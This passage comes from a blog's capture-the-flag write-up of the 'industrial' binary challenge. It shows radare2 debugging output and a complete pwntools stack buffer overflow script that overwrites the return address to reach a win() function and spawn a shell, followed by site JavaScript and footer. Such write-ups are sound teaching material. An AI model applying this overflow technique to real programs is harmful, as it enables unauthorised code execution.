<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">SIGNAL</span> <span class="mi">11</span> <span class="nx">errno</span><span class="o">=</span><span class="mi">0</span> <span class="nx">addr</span><span class="o">=</span><span class="mh">0x00000000</span> <span class="nx">code</span><span class="o">=</span><span class="mi">128</span> <span class="nx">si_pid</span><span class="o">=</span><span class="mi">0</span> <span class="nx">ret</span><span class="o">=</span><span class="mi">0</span>
<span class="p">[</span><span class="mh">0x7f764c1d2df4</span><span class="p">]</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>So we do see that we entered the <code class="language-plaintext highlighter-rouge">win()</code> function, but it returned a segmentation fault when continued, and specifically it SIGSEGVs within the <code class="language-plaintext highlighter-rouge">system()</code> function due to the <a href="https://man7.org/linux/man-pages/man7/signal.7.html">SIGNAL 11</a> before reaching the next breakpoint. But why? One possible reason could us messing with the <code class="language-plaintext highlighter-rouge">rbp</code> value, and the <code class="language-plaintext highlighter-rouge">system()</code> function when making internal calls tried referencing some restricted <code class="language-plaintext highlighter-rouge">rbp+offset</code> value. But we tried to put the same <code class="language-plaintext highlighter-rouge">rbp</code> value we saw so please let me know if you know. But for now, we can try skipping the function prologue so as to not push weird values onto the stack and go straight to the function (at <code class="language-plaintext highlighter-rouge">0x004011be</code>) and run the program again similarly.</p>

<h3 id="testing-exploit">Testing exploit</h3>

<div class="language-as highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x7f764c3b2440</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">db</span> <span class="mh">0x004011c8</span>
<span class="p">[</span><span class="mh">0x7f764c3b2440</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">db</span> <span class="mh">0x004011cd</span>
<span class="p">[</span><span class="mh">0x7f764c3b2440</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">dc</span>
<span class="nx">Enter</span> <span class="nx">the</span> <span class="nx">next</span> <span class="nx">command</span> <span class="o">:</span> <span class="nx">Thanks</span>
<span class="nl">INFO</span><span class="p">:</span> <span class="nx">hit</span> <span class="nx">breakpoint</span> <span class="nx">at</span><span class="o">:</span> <span class="mh">0x4011c8</span>
<span class="p">[</span><span class="mh">0x004011c8</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">dc</span>
<span class="p">(</span><span class="mi">48434</span><span class="p">)</span> <span class="nx">Created</span> <span class="nx">process</span> <span class="mi">48491</span>
<span class="p">[</span><span class="mh">0x7ffab8ba77a9</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">dc</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">SIGNAL</span> <span class="mi">17</span> <span class="nx">errno</span><span class="o">=</span><span class="mi">0</span> <span class="nx">addr</span><span class="o">=</span><span class="mh">0x3e80000bd6b</span> <span class="nx">code</span><span class="o">=</span><span class="mi">1</span> <span class="nx">si_pid</span><span class="o">=</span><span class="mi">48491</span> <span class="nx">ret</span><span class="o">=</span><span class="mi">0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">signal</span> <span class="mi">17</span> <span class="nx">aka</span> <span class="nx">SIGCHLD</span> <span class="nx">received</span> <span class="mi">0</span> <span class="p">(</span><span class="nx">Child</span><span class="p">)</span>
<span class="p">[</span><span class="mh">0x7ffab8b30a14</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">dc</span>
<span class="nl">INFO</span><span class="p">:</span> <span class="nx">hit</span> <span class="nx">breakpoint</span> <span class="nx">at</span><span class="o">:</span> <span class="mh">0x4011cd</span>
<span class="p">[</span><span class="mh">0x004011cd</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">dc</span>
</code></pre></div></div>

<p>This confirms we succesfully created a Bash process, but since it’s not connected to a terminal, we cannot access it directly. So let’s create a python program to input a payload and give us an interactive session. Below is the logic for it:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">proc</span><span class="p">):</span>
    <span class="n">proc</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Enter the next command : </span><span class="sh">"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x004011be</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">proc</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">proc</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<video style="width:100%; height:100%; border-radius:6px" controls="" autoplay="" muted="" loop="">
    <source src="/assets/images/articles/industrial.mp4" />
</video>

<p>And with this we exploited the binary to provide us the flag!</p>

<h2 id="complete-exploit">Complete Exploit</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">attach</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="n">proc</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Enter the next command : </span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">attach</span><span class="p">:</span>
        <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="sh">'</span><span class="s">b *0x00401260</span><span class="se">\n</span><span class="s">c</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">pause</span><span class="p">()</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x01</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x4011be</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">proc</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">proc</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span> 
    <span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/mehul/Documents/Codes/challenges/industrial/industrial</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">proc</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
        <span class="n">output</span> <span class="o">=</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">attach</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">An error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">proc</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">proc</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</code></pre></div></div>

<h1 id="resources">Resources</h1>

<ul>
  <li><a href="/assets/data/industrial.zip">Industrial.zip</a> (SHA256sum: 11e8de6b5c747a6e018fc7e4c86396acab9f67ed7051832cb45b216272731837)</li>
</ul>
</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2025-07-01T00:00:00+05:30"><!-- start custom article footer snippet -->

<!-- end custom article footer snippet -->
<div itemscope itemtype="http://schema.org/Person" class="author-profile card card--flat item"><a href="https://mehulsingh.com" class="item__image"><img class="author-profile__avatar" itemprop="image" src="https://xmehulx.github.io/assets/img/me.jpg" /></a><div class="item__content"><meta itemprop="name" content="Mehul Singh">
        <p class="author-profile__name"><meta itemprop="url" content="https://mehulsingh.com">
            <a href="https://mehulsingh.com">Mehul Singh</a></p><p itemprop="description">A graduate student working on his red-teaming journey.</p>

    </div>
</div>
<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
</div></footer>
<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/blessing.htb">Blessing - HackTheBox Challenge Writeup</a></div></div></div>

</div>

<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    $(function() {
      var $this ,$scroll;
      var $articleContent = $('.js-article-content');
      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
      $scroll = $(scroll);

      $articleContent.find('.highlight').each(function() {
        $this = $(this);
        $this.attr('data-lang', $this.find('code').attr('data-lang'));
      });
      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
        $this = $(this);
        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
      });
      $articleContent.on('click', '.anchor', function() {
        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
      });
    });
  });
})();
</script>
</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->

<!-- end custom main bottom snippet -->
</div>
            </div></div></div><div class="page__footer d-print-none">
<footer class="footer py-4 js-page-footer">
  <div class="main"><div itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Mehul Singh"><meta itemprop="url" content="https://mehulsingh.com"><meta itemprop="description" content="Mehul is an Graduate student with experience as a GRC advisor and Security Analyst, and who is working towards his expertise in red-teaming."><div class="footer__author-links"><div class="author-links">
  <ul class="menu menu--nowrap menu--inline"><link itemprop="url" href="https://mehulsingh.com"><li title="Follow me on Twitter.">
        <a class="button button--circle twitter-button" itemprop="sameAs" href="https://x.com/0x__shell" target="_blank">
          <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 72 72" viewBox="0 0 72 72" id="twitter-x">
  <switch>
    <g>
      <path d="M42.5,31.2L66,6h-6L39.8,27.6L24,6H4l24.6,33.6L4,66
			h6l21.3-22.8L48,66h20L42.5,31.2z M12.9,10h8l38.1,52h-8L12.9,10z"></path>
    </g>
  </switch>
</svg>
</div>
        </a>
      </li><li title="Follow me on Linkedin.">
        <a class="button button--circle linkedin-button" itemprop="sameAs" href="https://www.linkedin.com/in/mehul-singh-0x00" target="_blank">
          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M260.096 155.648c0 27.307008-9.899008 50.516992-29.696 69.632-19.796992 19.115008-45.396992 28.672-76.8 28.672-30.036992 0-54.612992-9.556992-73.728-28.672-19.115008-19.115008-28.672-42.324992-28.672-69.632 0-28.672 9.556992-52.224 28.672-70.656 19.115008-18.432 44.372992-27.648 75.776-27.648 31.403008 0 56.32 9.216 74.752 27.648 18.432 18.432 28.331008 41.984 29.696 70.656 0 0 0 0 0 0m-202.752 808.96c0 0 0-632.832 0-632.832 0 0 196.608 0 196.608 0 0 0 0 632.832 0 632.832 0 0-196.608 0-196.608 0 0 0 0 0 0 0m313.344-430.08c0-58.708992-1.364992-126.292992-4.096-202.752 0 0 169.984 0 169.984 0 0 0 10.24 88.064 10.24 88.064 0 0 4.096 0 4.096 0 40.96-68.267008 105.812992-102.4 194.56-102.4 68.267008 0 123.220992 22.868992 164.864 68.608 41.643008 45.739008 62.464 113.664 62.464 203.776 0 0 0 374.784 0 374.784 0 0-196.608 0-196.608 0 0 0 0-350.208 0-350.208 0-91.476992-33.451008-137.216-100.352-137.216-47.787008 0-81.236992 24.576-100.352 73.728-4.096 8.192-6.144 24.576-6.144 49.152 0 0 0 364.544 0 364.544 0 0-198.656 0-198.656 0 0 0 0-430.08 0-430.08 0 0 0 0 0 0" />
</svg>
</div>
        </a>
      </li><li title="Follow me on Github.">
        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/xmehulx" target="_blank">
          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
</svg>
</div>
        </a>
      </li></ul>
</div>
</div>
    </div><div class="site-info mt-2">
      <div>Kindly buy Mehul a <a title="This will really help in his certifications" href="http://buymeacoffee.com/xmehulx">cup of coffee</a>
      </div>
    </div>
  </div>
</footer>
</div></div>
    </div><script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $body = $('body'), $window = $(window);
    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
    var activeCount = 0;
    function modal(options) {
      var $root = this, visible, onChange, hideWhenWindowScroll = false;
      var scrollTop;
      function setOptions(options) {
        var _options = options || {};
        visible = _options.initialVisible === undefined ? false : show;
        onChange = _options.onChange;
        hideWhenWindowScroll = _options.hideWhenWindowScroll;
      }
      function init() {
        setState(visible);
      }
      function setState(isShow) {
        if (isShow === visible) {
          return;
        }
        visible = isShow;
        if (visible) {
          activeCount++;
          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
          $root.addClass('modal--show');
          $pageMain.scrollTop(scrollTop);
          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
          $window.on('keyup', handleKeyup);
        } else {
          activeCount > 0 && activeCount--;
          $root.removeClass('modal--show');
          $window.scrollTop(scrollTop);
          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
          $window.off('keyup', handleKeyup);
        }
        onChange && onChange(visible);
      }
      function show() {
        setState(true);
      }
      function hide() {
        setState(false);
      }
      function handleKeyup(e) {
        // Char Code: 27  ESC
        if (e.which ===  27) {
          hide();
        }
      }
      setOptions(options);
      init();
      return {
        show: show,
        hide: hide,
        $el: $root
      };
    }
    $.fn.modal = modal;
  });
})();
</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
(function () {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    // search panel
    var search = (window.search || (window.search = {}));
    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
      true : window.useDefaultSearchBox ;

    var $searchModal = $('.js-page-search-modal');
    var $searchToggle = $('.js-search-toggle');
    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
    var modalVisible = false;
    search.searchModal = searchModal;

    var $searchBox = null;
    var $searchInput = null;
    var $searchClear = null;

    function getModalVisible() {
      return modalVisible;
    }
    search.getModalVisible = getModalVisible;

    function handleModalChange(visible) {
      modalVisible = visible;
      if (visible) {
        search.onShow && search.onShow();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
      } else {
        search.onShow && search.onHide();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
        setTimeout(function() {
          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
          search.clear && search.clear();
          window.pageAsideAffix && window.pageAsideAffix.refresh();
        }, 400);
      }
    }

    $searchToggle.on('click', function() {
      modalVisible ? searchModal.hide() : searchModal.show();
    });
    // Char Code: 83  S, 191 /
    $(window).on('keyup', function(e) {
      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
        modalVisible || searchModal.show();
      }
    });

    if (useDefaultSearchBox) {
      $searchBox = $('.js-search-box');
      $searchInput = $searchBox.children('input');
      $searchClear = $searchBox.children('.js-icon-clear');
      search.getSearchInput = function() {
        return $searchInput.get(0);
      };
      search.getVal = function() {
        return $searchInput.val();
      };
      search.setVal = function(val) {
        $searchInput.val(val);
      };

      $searchInput.on('focus', function() {
        $(this).addClass('focus');
      });
      $searchInput.on('blur', function() {
        $(this).removeClass('focus');
      });
      $searchInput.on('input', window.throttle(function() {
        var val = $(this).val();
        if (val === '' || typeof val !== 'string') {
          search.clear && search.clear();
        } else {
          $searchBox.addClass('not-empty');
          search.onInputNotEmpty && search.onInputNotEmpty(val);
        }
      }, 400));
      $searchClear.on('click', function() {
        $searchInput.val(''); $searchBox.removeClass('not-empty');
        search.clear && search.clear();
      });
    }
  });
})();
</script><div class="search search--dark">
  <div class="main">
    <div class="search__header">Search</div>
    <div class="search-bar">
      <div class="search-box js-search-box">
        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
        <input type="text" />
        <div class="search-box__icon-clear js-icon-clear">
          <a><i class="fas fa-times"></i></a>
        </div>
      </div>
      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
        Cancel</button>
    </div>
    <div class="search-result js-search-result"></div>
  </div>
</div>
<script>var SOURCES = window.TEXT_VARIABLES.sources;
var PAHTS = window.TEXT_VARIABLES.paths;
window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
  var search = (window.search || (window.search = {}));
  var searchData = window.TEXT_SEARCH_DATA || {};

  function memorize(f) {
    var cache = {};
    return function () {
      var key = Array.prototype.join.call(arguments, ',');
      if (key in cache) return cache[key];
      else return cache[key] = f.apply(this, arguments);
    };
  }

  /// search
  function searchByQuery(query) {
    var i, j, key, keys, cur, _title, result = {};
    keys = Object.keys(searchData);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      for (j = 0; j < searchData[key].length; j++) {
        cur = searchData[key][j], _title = cur.title;
        if ((result[key] === undefined || result[key] && result[key].length < 4 )
          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
          if (result[key] === undefined) {
            result[key] = [];
          }
          result[key].push(cur);
        }
      }
    }
    return result;
  }

  var renderHeader = memorize(function(header) {
    return $('<p class="search-result__header">' + header + '</p>');
  });

  var renderItem = function(index, title, url) {
    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
  };

  function render(data) {
    if (!data) { return null; }
    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
    keys = Object.keys(data);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      $root.append(renderHeader(key));
      for (j = 0; j < data[key].length; j++) {
        cur = data[key][j];
        $root.append(renderItem(itemIndex++, cur.title, cur.url));
      }
    }
    return $root;
  }

  // search box
  var $result = $('.js-search-result'), $resultItems;
  var lastActiveIndex, activeIndex;

  function clear() {
    $result.html(null);
    $resultItems = $('.search-result__item'); activeIndex = 0;
  }
  function onInputNotEmpty(val) {
    $result.html(render(searchByQuery(val)));
    $resultItems = $('.search-result__item'); activeIndex = 0;
    $resultItems.eq(0).addClass('active');
  }

  search.clear = clear;
  search.onInputNotEmpty = onInputNotEmpty;

  function updateResultItems() {
    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
  }

  function moveActiveIndex(direction) {
    var itemsCount = $resultItems ? $resultItems.length : 0;
    if (itemsCount > 1) {
      lastActiveIndex = activeIndex;
      if (direction === 'up') {
        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
      } else if (direction === 'down') {
        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
      }
      updateResultItems();
    }
  }

  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
  $(window).on('keyup', function(e) {
    var modalVisible = search.getModalVisible && search.getModalVisible();
    if (modalVisible) {
      if (e.which === 38) {
        modalVisible && moveActiveIndex('up');
      } else if (e.which === 40) {
        modalVisible && moveActiveIndex('down');
      } else if (e.which === 13) {
        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
      }
    }
  });

  $result.on('mouseover', '.search-result__item > a', function() {
    var itemIndex = $(this).parent().data('index');
    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
  });
});
</script>
</div></div>


<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function scrollToAnchor(anchor, duration, callback) {
      var $root = this;
      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
        callback && callback();
      });
    }
    $.fn.scrollToAnchor = scrollToAnchor;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function affix(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroll,
        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
        hasInit = false, curState;

      function setOptions(options) {
        var _options = options || {};
        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroll && (scroll = _options.scroll);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $scrollTarget = $(scrollTarget);
        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
        $scroll = $(scroll);
      }
      function preCalc() {
        top();
        rootHeight = $root.outerHeight();
        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
        rootLeft = $root.offset().left;
      }
      function calc(needPreCalc) {
        needPreCalc && preCalc();
        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
        rootBottomTop = scrollBottom - rootTop;
      }
      function top() {
        if (curState !== 'top') {
          $root.removeClass('fixed').css({
            left: 0,
            top: 0
          });
          curState = 'top';
        }
      }
      function fixed() {
        if (curState !== 'fixed') {
          $root.addClass('fixed').css({
            left: rootLeft + 'px',
            top: 0
          });
          curState = 'fixed';
        }
      }
      function bottom() {
        if (curState !== 'bottom') {
          $root.removeClass('fixed').css({
            left: 0,
            top: rootBottomTop + 'px'
          });
          curState = 'bottom';
        }
      }
      function setState() {
        var scrollTop = $scrollTarget.scrollTop();
        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
          fixed();
        } else if (scrollTop < rootTop) {
          top();
        } else {
          bottom();
        }
      }
      function init() {
        if(!hasInit) {
          var interval, timeout;
          calc(true); setState();
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState();
          });
          $window.on('resize', function() {
            disabled || (calc(true), setState());
          });
          hasInit = true;
        }
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions,
        refresh: function() {
          calc(true, { animation: false }); setState();
        }
      };
    }
    $.fn.affix = affix;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function toc(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
        headingsPos, scrolling = false, hasRendered = false, hasInit = false;

      function setOptions(options) {
        var _options = options || {};
        _options.selectors && (selectors = _options.selectors);
        _options.container && (container = _options.container);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroller && (scroller = _options.scroller);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $headings = $(container).find(selectors).filter('[id]');
        $scrollTarget = $(scrollTarget);
        $scroller = $(scroller);
      }
      function calc() {
        headingsPos = [];
        $headings.each(function() {
          headingsPos.push(Math.floor($(this).position().top));
        });
      }
      function setState(element, disabled) {
        var scrollTop = $scrollTarget.scrollTop(), i;
        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
        if (element) {
          $activeCur = element;
        } else {
          for (i = 0; i < headingsPos.length; i++) {
            if (scrollTop >= headingsPos[i]) {
              $activeCur = $tocLi.eq(i);
            } else {
              $activeCur || ($activeCur = $tocLi.eq(i));
              break;
            }
          }
        }
        $activeLast && $activeLast.removeClass('active');
        ($activeLast = $activeCur).addClass('active');
      }
      function render() {
        if(!hasRendered) {
          $root.append($tocUl);
          $headings.each(function() {
            var $this = $(this);
            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
          });
          $tocLi = $tocUl.children('li');
          $tocUl.on('click', 'a', function(e) {
            e.preventDefault();
            var $this = $(this);
            scrolling = true;
            setState($this.parent());
            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
              scrolling = false;
            });
          });
        }
        hasRendered = true;
      }
      function init() {
        var interval, timeout;
        if(!hasInit) {
          render(); calc(); setState(null, scrolling);
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState(null, scrolling);
          });
          $window.on('resize', window.throttle(function() {
            if (!disabled) {
              render(); calc(); setState(null, scrolling);
            }
          }, 100));
        }
        hasInit = true;
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions
      };
    }
    $.fn.toc = toc;
  });
})();
/*(function () {

})();*/
</script><script>
  /* toc must before affix, since affix need to konw toc' height. */(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window);
    var $articleContent = $('.js-article-content');
    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
    var toc;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;

    function disabled() {
      return $col2.css('display') === 'none' || !hasToc;
    }

    tocDisabled = disabled();

    toc = $tocRoot.toc({
      selectors: TOC_SELECTOR,
      container: $articleContent,
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      tocDisabled = disabled();
      toc && toc.setOptions({
        disabled: tocDisabled
      });
    }, 100));

  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window), $pageFooter = $('.js-page-footer');
    var $pageAside = $('.js-page-aside');
